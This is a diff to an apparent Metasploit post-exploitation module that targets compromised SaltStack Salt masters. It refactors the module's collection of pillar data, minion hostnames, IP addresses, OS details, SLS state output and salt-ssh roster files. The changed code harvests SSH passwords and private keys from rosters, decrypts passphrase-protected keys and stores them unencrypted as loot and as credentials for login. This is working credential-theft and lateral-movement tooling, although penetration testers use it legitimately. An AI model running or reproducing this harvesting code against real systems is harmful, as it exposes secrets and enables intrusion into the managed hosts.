@@ -4,6 +4,7 @@
 ##
 
 require 'yaml'
+require 'net/ssh'
 
 class MetasploitModule < Msf::Post
   include Msf::Post::File
@@ -51,12 +52,14 @@ class MetasploitModule < Msf::Post
   def gather_pillars
     print_status('Gathering pillar data')
     begin
-      out = cmd_exec('salt', "'#{datastore['MINIONS']}' --output=yaml pillar.items", datastore['TIMEOUT'])
+      out = salt_command_output('salt', [datastore['MINIONS'], '--output=yaml', 'pillar.items'])
+      return if out.nil?
+
       vprint_status(out)
-      results = YAML.safe_load(out, [Symbol]) # during testing we discovered at times Symbol needs to be loaded
+      results = YAML.safe_load(out, permitted_classes: [Symbol]) # Some Salt output contains symbols.
       store_path = store_loot('saltstack_pillar_data_gather', 'application/x-yaml', session, results.to_yaml, 'pillar_gather.yaml', 'SaltStack Salt Pillar Gather')
       print_good("#{peer} - pillar data gathering successfully retrieved and saved to #{store_path}")
-    rescue Psych::SyntaxError
+    rescue Psych::SyntaxError, Psych::DisallowedClass
       print_error('Unable to process pillar command output')
       return
     end
@@ -64,60 +67,50 @@ class MetasploitModule < Msf::Post
 
   def gather_minion_data
     print_status('Gathering data from minions (this can take some time)')
-    command = []
-    if datastore['GETHOSTNAME']
-      command << 'network.get_hostname'
-    end
-    if datastore['GETIP']
-      # command << 'network.ip_addrs'
-      command << 'network.interfaces'
-    end
-    if datastore['GETOS']
-      command << 'status.version' # seems to work on linux
-      command << 'system.get_system_info' # seems to work on windows, part of salt.modules.win_system
-    end
-    commas = ',' * (command.length - 1) # we need to provide empty arguments for each command
-    command = "salt '#{datastore['MINIONS']}' --output=yaml #{command.join(',')} #{commas}"
-    begin
-      out = cmd_exec(command, nil, datastore['TIMEOUT'])
-      if out == '' || out.nil?
-        print_error('No results returned. Try increasing the TIMEOUT or decreasing the minions being checked')
-        return
-      end
+    functions = {}
+    functions['network.get_hostname'] = [] if datastore['GETHOSTNAME']
+    functions['network.interfaces'] = [] if datastore['GETIP']
+    # Grains work across minion platforms; a compound request containing an
+    # unavailable platform-specific function can lose otherwise valid results.
+    # OS loot retains the function-keyed shape, using grains.item for these keys.
+    functions['grains.item'] = %w[kernel os osrelease kernelrelease osfullname] if datastore['GETOS']
+    return if functions.empty?
+
+    results = {}
+    functions.each do |function, arguments|
+      out = salt_command_output('salt', [datastore['MINIONS'], '--output=yaml', function, *arguments])
+      next if out.nil?
+
       vprint_status(out)
-      results = YAML.safe_load(out, [Symbol]) # during testing we discovered at times Symbol needs to be loaded
-      store_path = store_loot('saltstack_minion_data_gather', 'application/x-yaml', session, results.to_yaml, 'minion_data_gather.yaml', 'SaltStack Salt Minion Data Gather')
-      print_good("#{peer} - minion data gathering successfully retrieved and saved to #{store_path}")
-    rescue Psych::SyntaxError
-      print_error('Unable to process gather command output')
+      values = YAML.safe_load(out, permitted_classes: [Symbol])
+      unless values.is_a?(Hash)
+        print_error("Salt #{function} did not return a minion mapping")
+        next
+      end
+      values.each do |name, value|
+        results[name] ||= {}
+        results[name][function] = value
+      end
+    rescue Psych::SyntaxError, Psych::DisallowedClass
+      print_error("Unable to process Salt #{function} output")
+    end
+    if results.empty?
+      print_error('No minion results returned. Try increasing TIMEOUT or reducing the selected minions')
       return
     end
-    return if results == false || results.nil?
-    return if results.include?('Salt request timed out.') || results.include?('Minion did not return.')
+    store_path = store_loot('saltstack_minion_data_gather', 'application/x-yaml', session, results.to_yaml, 'minion_data_gather.yaml', 'SaltStack Salt Minion Data Gather')
+    print_good("#{peer} - minion data gathering retrieved and saved to #{store_path}")
 
     results.each_value do |result|
-      # at times the first line may be "Minions returned with non-zero exit code", so we want to skip that
-      next if result.is_a? String
-
-      host_info = {
-        name: result['network.get_hostname'],
-        os_flavor: result['status.version'],
-        comments: "SaltStack Salt minion to #{session.session_host}"
-      }
-      # mac os
-      if result.key?('system.get_system_info') &&
-         result['system.get_system_info'].include?('Traceback') &&
-         result.key?('status.version') &&
-         result['status.version'].include?('unsupported on the current operating system')
-        host_info[:os_name] = 'osx' # taken from lib/msf/core/post/osx/system
-        host_info[:os_flavor] = ''
-      # windows will throw a traceback error for status.version
-      elsif result.key?('status.version') &&
-            result['status.version'].include?('Traceback')
-        info = result['system.get_system_info']
-        host_info[:os_name] = info['os_name']
-        host_info[:os_flavor] = info['os_version']
-        host_info[:purpose] = info['os_type']
+      grains = result['grains.item'].is_a?(Hash) ? result['grains.item'] : {}
+      host_info = { comments: "SaltStack Salt minion to #{session.session_host}" }
+      hostname = result['network.get_hostname']
+      host_info[:name] = hostname if datastore['GETHOSTNAME'] && hostname.is_a?(String) && !hostname.empty?
+      if datastore['GETOS']
+        kernel = grains['kernel']
+        host_info[:os_name] = kernel == 'Darwin' ? 'osx' : kernel if kernel.is_a?(String) && !kernel.empty?
+        flavor = [grains['osfullname'] || grains['os'], grains['osrelease']].select { |value| value.is_a?(String) && !value.empty? }.join(' ')
+        host_info[:os_flavor] = flavor unless flavor.empty?
       end
 
       unless datastore['GETIP'] # if we dont get IP, can't make hosts
@@ -125,16 +118,27 @@ class MetasploitModule < Msf::Post
         next
       end
 
-      result['network.interfaces'].each do |name, interface|
+      interfaces = result['network.interfaces']
+      unless interfaces.is_a?(Hash)
+        print_error('Salt network.interfaces did not return an interface mapping for a minion')
+        next
+      end
+      interfaces.each do |name, interface|
+        next unless interface.is_a?(Hash)
+
         next if name == 'lo'
         next if interface['hwaddr'] == ':::::' # Windows Software Loopback Interface
-        next unless interface.key? 'inet' # skip if it doesn't have an inet, macos had lots of this
-        next if interface['inet'][0]['address'] == '127.0.0.1' # ignore localhost
 
-        host_info[:mac] = interface['hwaddr']
-        host_info[:host] = interface['inet'][0]['address'] # ignoring inet6
-        report_host(host_info)
-        print_good("Found minion: #{host_info[:name]} (#{host_info[:host]}) - #{host_info[:os_flavor]}")
+        Array(interface['inet']).each do |address|
+          next unless address.is_a?(Hash)
+
+          ip = address['address']
+          next unless Rex::Socket.is_ipv4?(ip.to_s)
+          next if ip.start_with?('127.')
+
+          report_host(host_info.merge(mac: interface['hwaddr'], host: ip))
+          print_good("Found minion: #{host_info[:name]} (#{ip}) - #{host_info[:os_flavor]}")
+        end
       end
     end
   end
@@ -149,16 +153,16 @@ class MetasploitModule < Msf::Post
       'Columns' => ['Status', 'Minion Name']
     )
 
-    minions.each do |minion|
+    minions['minions'].each do |minion|
       tbl << ['Accepted', minion]
     end
-    minions['minions_pre'].each do |minion|
+    Array(minions['minions_pre']).each do |minion|
       tbl << ['Unaccepted', minion]
     end
-    minions['minions_rejected'].each do |minion|
+    Array(minions['minions_rejected']).each do |minion|
       tbl << ['Rejected', minion]
     end
-    minions['minions_denied'].each do |minion|
+    Array(minions['minions_denied']).each do |minion|
       tbl << ['Denied', minion]
     end
     print_good(tbl.to_s)
@@ -194,9 +198,11 @@ class MetasploitModule < Msf::Post
       return
     end
     print_status('Showing SLS')
-    output = cmd_exec('salt', "'#{datastore['MINIONS']}' state.show_sls '*'", datastore['TIMEOUT'])
-    store_path = store_loot('saltstack_sls', 'text/plain', session, output, 'sls.txt', 'SaltStack Salt Master SLS Output')
-    print_good("#{peer} - SLS output successfully retrieved and saved to #{store_path}")
+    output = salt_command_output('salt', [datastore['MINIONS'], 'state.show_sls', '*'])
+    unless output.nil?
+      store_path = store_loot('saltstack_sls', 'text/plain', session, output, 'sls.txt', 'SaltStack Salt Master SLS Output')
+      print_good("#{peer} - SLS output successfully retrieved and saved to #{store_path}")
+    end
 
     # get roster
     # https://github.com/saltstack/salt/blob/023528b3b1b108982989c4872c138d1796821752/doc/topics/ssh/roster.rst#salt-rosters
@@ -207,15 +213,20 @@ class MetasploitModule < Msf::Post
 
       begin
         minions = YAML.safe_load(read_file(config))
-      rescue Psych::SyntaxError
+      rescue Psych::SyntaxError, Psych::DisallowedClass
         print_error("Unable to load #{config}")
         next
       end
-      store_path = store_loot('saltstack_roster', 'application/x-yaml', session, minion.to_yaml, 'roster.yaml', 'SaltStack Salt Roster File')
+      store_path = store_loot('saltstack_roster', 'application/x-yaml', session, minions.to_yaml, 'roster.yaml', 'SaltStack Salt Roster File')
       print_good("#{peer} - roster file successfully retrieved and saved to #{store_path}")
-      next if minions.nil?
+      unless minions.is_a?(Hash)
+        print_error('Salt roster does not contain a minion mapping')
+        next
+      end
 
       minions.each do |name, minion|
+        next unless minion.is_a?(Hash)
+
         host = minion['host'] # aka ip
         user = minion['user']
         port = minion['port'] || 22
@@ -265,8 +276,9 @@ class MetasploitModule < Msf::Post
 
         # handle ssh keys if it wasn't a password
         cred[:private_type] = :ssh_key
-        if priv_values[priv]
-          cred[:private_data] = priv_values[priv]
+        cache_key = [priv, priv_pass]
+        if priv_values[cache_key]
+          cred[:private_data] = priv_values[cache_key]
           create_credential_and_login(cred)
           next
         end
@@ -278,7 +290,24 @@ class MetasploitModule < Msf::Post
         input = read_file(priv)
         store_path = store_loot('ssh_key', 'plain/txt', session, input, 'salt-ssh.rsa', 'SaltStack Salt SSH Private Key')
         print_good("  #{priv} stored to #{store_path}")
-        priv_values[priv] = input
+        begin
+          # Use the same parser as credential validation, without an interactive
+          # passphrase prompt. Preserve plain OpenSSH keys as supplied; known
+          # encrypted PEM keys must be exported unencrypted for the database.
+          key = Net::SSH::KeyFactory.load_data_private_key(input, priv_pass || '', false)
+          if priv_pass
+            unless key.respond_to?(:to_pem)
+              print_error("Unable to export decrypted salt-ssh key #{priv}")
+              next
+            end
+            input = key.to_pem
+          end
+        rescue OpenSSL::OpenSSLError, ArgumentError, Net::SSH::Exception => e
+          print_error("Unable to load salt-ssh key #{priv}: #{e.message}")
+          elog('Salt SSH key parsing failed', error: e)
+          next
+        end
+        priv_values[cache_key] = input
         cred[:private_data] = input
         create_credential_and_login(cred)
       end
